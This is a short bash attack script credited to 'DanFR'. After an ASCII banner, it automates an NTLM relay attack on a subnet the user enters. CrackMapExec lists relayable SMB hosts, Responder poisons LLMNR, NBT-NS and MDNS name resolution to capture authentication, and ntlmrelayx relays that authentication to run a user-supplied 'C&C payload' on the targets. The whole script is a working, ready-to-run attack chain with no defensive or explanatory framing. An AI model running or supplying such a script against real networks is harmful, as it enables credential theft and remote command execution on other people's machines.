#!/bin/bash

OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'
REGEX='^[0-9]+$'

echo -e "$OKRED"
echo -e "$OKRED                             ____"
echo -e "$OKRED                     __,-~~/~    \`---."
echo -e "$OKRED                   _/_,---(      ,    )"
echo -e "$OKRED               __ /        <    /   )  \___"
echo -e "$OKRED- ------===;;;'====---------------------===';;;===----- -  -"
echo -e "$OKRED                  \/  ~'~'~'~'~'~\~'~)~'/"
echo -e "$OKRED                  (_ (   \  (     >    \)"
echo -e "$OKRED                   \_( _ <         >_>'"
echo -e "$OKRED                      ~ \`-i' ::>|--\""
echo -e "$OKRED                          I;|.|.|$RESET IPVsecurity"
echo -e "$OKRED                         <|i::|i|\`."
echo -e "$OKRED                       (\` ^''\`-' ')"
echo -e "$OKRED------------------------------------------------------------- $RESET"
echo -e "    this tool combine 3 tools - cme,responder,ntlmrelayx "
echo -e " "
echo -e "$OKORANGE            + -- --=[Created by DanFR]=-- -- +  $RESET"
echo -e " "

i=445
read -p "Enter Subnet IP Address: " IPs
echo -e " "
read -p "Enter C&C Payload: " Pyload
echo -e " "
echo -e " "
gnome-terminal -- cme smb $IPs --gen-relay-list /root/Desktop/targets.txt
echo "Scan all vulnerable IP Address in $IPs -->"
echo -e " "
sleep 7

gnome-terminal -- python Responder/Responder.py -I eth0 -r -d -w
echo "Run responder - LLMNR, NBT-NS and MDNS poisoner -->"
echo -e " "
sleep 7

gnome-terminal -- ntlmrelayx.py -tf /root/Desktop/targets.txt -c "$Pyload"
echo "Run NTLMrelayx for Pass the Hash with the payload -->"
echo -e " "
